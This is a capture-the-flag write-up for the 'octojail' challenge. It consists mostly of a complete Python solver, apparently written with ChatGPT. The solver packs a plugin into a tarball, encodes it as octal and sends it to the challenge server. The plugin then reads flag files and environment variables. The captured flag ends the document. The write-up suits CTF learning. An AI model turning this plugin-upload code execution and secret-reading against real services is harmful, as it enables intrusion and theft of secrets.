# _octojail_

Category | value
-- | --
Misc | 100

***

After I understood the logic behind **main.py**, I called upon my little green friend ChatGPT to write a possible plugin that would exfiltrate the flag. In a nutshell, the script builds a tarball containing **plugin.py**, encodes it as octal triplets, connects to the server, and sends the payload.

## Solver
```python
#!/usr/bin/env python3
import io, tarfile, time, socket, sys, select

DEFAULT_PLUGIN = b"""\
def run():
    import os, glob
    for p in ("/flag","/flag.txt","flag","flag.txt"):
        try:
            print(open(p).read(), end="")
            return
        except Exception:
            pass
    for k in ("FLAG","flag","CTF_FLAG"):
        v = os.environ.get(k)
        if v:
            print(v, end="")
            return
    # fallback: try a few readable files in cwd (short)
    for f in glob.glob("*.txt")[:5]:
        try:
            print(open(f).read(), end="")
            return
        except Exception:
            pass
    print("no-flag")
"""

def build_tar(plugin_bytes: bytes) -> bytes:
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w") as tf:
        ti = tarfile.TarInfo(name="plugin.py")
        ti.size = len(plugin_bytes)
        ti.mtime = int(time.time())
        ti.mode = 0o644
        tf.addfile(ti, io.BytesIO(plugin_bytes))
    return bio.getvalue()

def to_octal_triplets(b: bytes) -> str:
    return ''.join(f"{byte:03o}" for byte in b)

def recv_all_until_close(sock, timeout=5.0):
    sock.setblocking(False)
    out = b""
    start = time.time()
    while True:
        if time.time() - start > timeout:
            break
        r, _, _ = select.select([sock], [], [], 0.2)
        if r:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
            start = time.time()
    return out

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 simple_solver.py <host> <port>", file=sys.stderr)
        sys.exit(2)
    host = sys.argv[1]
    port = int(sys.argv[2])

    tar_bytes = build_tar(DEFAULT_PLUGIN)
    octal = to_octal_triplets(tar_bytes)
    if len(octal) > 300_000:
        print("Payload too large", file=sys.stderr)
        sys.exit(1)

    try:
        s = socket.create_connection((host, port), timeout=5)
    except Exception as e:
        print(f"Connection failed: {e}", file=sys.stderr)
        sys.exit(1)

    banner = recv_all_until_close(s, timeout=2.0)
    try:
        s.sendall(octal.encode() + b"\n")
    except Exception as e:
        print(f"Send failed: {e}", file=sys.stderr)
        s.close()
        sys.exit(1)

    resp = recv_all_until_close(s, timeout=5.0)
    s.close()

    out = banner + resp
    try:
        print(out.decode(errors="ignore"), end="")
    except Exception:
        print(out)

if __name__ == "__main__":
    main()
```

## Proof-of-flag
```
ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}
```